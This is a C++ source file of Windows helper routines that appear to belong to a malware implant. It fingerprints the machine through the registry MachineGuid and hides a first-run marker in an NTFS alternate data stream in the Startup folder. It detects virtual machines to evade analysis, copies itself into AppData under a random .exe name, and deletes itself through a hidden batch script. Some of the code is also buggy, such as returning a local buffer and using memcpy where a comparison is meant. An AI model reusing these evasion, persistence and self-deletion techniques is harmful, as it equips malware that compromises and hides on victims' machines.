#include "utils.h"

BOOL GetEncryptedMachineGUID(const WCHAR* encryptedMachineGuid, DWORD size) {
	// encrypted Machine GUID later
	HKEY hKey;
	
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
		return FALSE;
	}
	
	if (RegQueryValueExW(hKey, L"MachineGuid", NULL, NULL, (LPBYTE)encryptedMachineGuid, &size) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return FALSE;
	}

	RegCloseKey(hKey);
	return TRUE;
}

BOOL IsFirstTime() {

	WCHAR userProfile[MAX_PATH];
	GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);
	WCHAR adsPath[MAX_PATH];
	swprintf_s(adsPath, MAX_PATH, L"%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\config.ini:$DATA", userProfile);
	
	// check ads 
	HANDLE hFile = CreateFileW(adsPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		// ads is already existed, it's not the first time
		CloseHandle(hFile);
		return FALSE;
	}

	// if this is the first time
	hFile = CreateFileW(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return TRUE;
	}
	// cannot create ADS (no privilege?)
	return FALSE;
	//.\streams64.exe -d "C:\Users\thanh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\config.ini"
}

BOOL IsVmProcessRunning() {
	return TRUE;
}

BOOL IsRunningInVM() {
	// check CPUID to detect hypervisor/VM
	int cpuInfo[4] = { 0 };
	__cpuid(cpuInfo, 1);
	// bit 31th of ecx is hypervisor bit, if it equals 1 --> running inside VM
	BOOL hypervisorBit = (cpuInfo[2] & (1 << 31));// need to special handle with Microsoft Hv

	// check vendor ID of hypervisor
	const auto queryVendorIdMagic = 0x40000000;
	__cpuid(cpuInfo, queryVendorIdMagic);
	const int vendorIdLength = 13;
	char hyperVendorId[vendorIdLength] = {};
	memcpy(hyperVendorId + 0, &cpuInfo[1], 4);
	memcpy(hyperVendorId + 4, &cpuInfo[2], 4);
	memcpy(hyperVendorId + 8, &cpuInfo[3], 4);
	hyperVendorId[12] = '\0';

	static const char vendors[][13] = {
		"KVMKVMKVM\0\0\0", // KVM
		"VMwareVMware",    // VMware
		"XenVMMXenVMM",    // Xen
		"prl hyperv  ",    // Parallels
		"VBoxVBoxVBox"     // VirtualBox
	};

	BOOL isVmVendor = FALSE;
	for (const auto& vendor : vendors) {
		if (!memcmp(vendor, hyperVendorId, vendorIdLength)) {
			isVmVendor =  TRUE;
			break;
		}
	}

	// special check with Hyper-V
	if (memcpy(hyperVendorId, "Microsoft Hv", vendorIdLength) == 0 && hypervisorBit) {
		// need to check vm processes 
		if (IsVmProcessRunning()) {
			return TRUE; // is VM Hyper-V
		}
		return FALSE; // is real machine but enable Hyper-V
	}

	if (hypervisorBit && isVmVendor) {
		return TRUE;
	}
	return FALSE;
}

WCHAR* GenerateRandomFileName() {
	const WCHAR* chars = L"abcdefghijklmnopqrstuvwxyz0123456789";
	const int len = 8;
	const int totalSize = len + 4 + 1; // 8 chars + ".exe" + null
	
	WCHAR randomName[totalSize] = { 0 };
	
	srand(static_cast<unsigned int>(time(NULL)));
	for (int i = 0; i < len; i++) {
		randomName[i] = chars[rand() % 36];
	}

	// append ".exe"
	wcscpy_s(randomName + len, totalSize - len, L".exe");

	return randomName;
}

BOOL CopyToAppData(const WCHAR* currentPath, WCHAR* newPath) {
	WCHAR appDataPath[MAX_PATH];
	if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
		return FALSE;
	}
	// create new path in %APPDATA%\Microsoft\Windows
	WCHAR newDir[MAX_PATH];
	wcscpy_s(newDir, MAX_PATH, appDataPath);
	wcscat_s(newDir, MAX_PATH, L"\\Microsoft\\Windows");
	if (!CreateDirectoryW(newDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
		return FALSE;
	}

	// Create random file name 
	WCHAR* randomFileName = GenerateRandomFileName();
	wcscpy_s(newPath, MAX_PATH, newDir);
	wcscat_s(newPath, MAX_PATH, L"\\");
	wcscat_s(newPath, MAX_PATH, randomFileName);

	// copy file to new path
	if (!CopyFileW(currentPath, newPath, FALSE)) {
		return FALSE;
	}
	return TRUE;
}

BOOL DeleteOrigin(const WCHAR* originPath) {
	WCHAR batchPath[MAX_PATH];
	wcscpy_s(batchPath, MAX_PATH, L"C:\\Windows\\Temp\\cook.bat");

	// create batch script: wait for 5s then remove files
	char batchContent[512]; // ansi, not unicode because cmd.exe just understands ansi code
	snprintf(batchContent, 512, "@echo off\r\nping 127.0.0.1 -n 10 > nul\r\ndel \"%S\"\r\ndel \"%S\"", originPath, batchPath);

	// write script to file
	HANDLE hFile = CreateFileW(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	DWORD bytesWritten;
	WriteFile(hFile, batchContent, strlen(batchContent), &bytesWritten, NULL);
	CloseHandle(hFile);

	// run batch script
	ShellExecuteW(NULL, L"open", batchPath, NULL, NULL, SW_HIDE);
	return TRUE;
}

DWORD GetRandomInterval(DWORD minSeconds, DWORD maxSeconds) {
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<DWORD> dis(minSeconds, maxSeconds);
	return dis(gen) * 1000; // convert to milisecond
}
VOID EscapeJsonString(const char* input, char* output, DWORD outputSize) {
	if (!input || !output || outputSize == 0) {
		if (output && outputSize > 0) {
			output[0] = '\0';
		}
		return;
	}
	DWORD j = 0;
	for (DWORD i = 0; input[i] && j < outputSize - 1; i++) {
		switch (input[i]) {
		case '"':
			if (j < outputSize - 2) {
				output[j++] = '\\';
				output[j++] = '"';
			}
			break;
		case '\\':
			if (j < outputSize - 2) {
				output[j++] = '\\';
				output[j++] = '\\';
			}
			break;
		case '\n':
			if (j < outputSize - 2) {
				output[j++] = '\\';
				output[j++] = 'n';
			}
			break;
		case '\r':
			if (j < outputSize - 2) {
				output[j++] = '\\';
				output[j++] = 'r';
			}
			break;
		case '\t':
			if (j < outputSize - 2) {
				output[j++] = '\\';
				output[j++] = 't';
			}
			break;
		case '\b':
			if (j < outputSize - 2) {
				output[j++] = '\\';
				output[j++] = 'b';
			}
			break;
		case '\f':
			if (j < outputSize - 2) {
				output[j++] = '\\';
				output[j++] = 'f';
			}
			break;
		default:
			// Chỉ thoát các ký tự điều khiển (dưới 32), còn lại giữ nguyên UTF-8
			if ((unsigned char)input[i] < 32) {
				if (j < outputSize - 6) {
					snprintf(output + j, outputSize - j, "\\u%04X", (unsigned char)input[i]);
					j += 6;
				}
			}
			else {
				output[j++] = input[i];
			}
			break;
		}
	}
	output[j] = '\0';
}

// convert WCHAR (utf-16) to char(utf-8)
VOID WStringToString(const WCHAR* wStr, char* str, DWORD size) {
	if (!wStr || !str || size == 0) {
		if (str && size > 0)
			str[0] = '\0';
		return;
	}
	WideCharToMultiByte(CP_UTF8, 0, wStr, -1, str, (int)size, NULL, NULL);
}